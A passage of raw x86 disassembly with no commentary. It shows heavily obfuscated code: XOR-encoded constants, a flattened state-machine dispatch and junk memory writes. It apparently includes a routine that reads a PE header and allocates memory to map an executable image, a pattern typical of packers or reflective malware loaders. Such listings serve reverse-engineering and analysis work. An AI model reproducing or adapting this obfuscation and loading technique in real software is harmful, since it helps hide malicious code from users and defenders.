  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
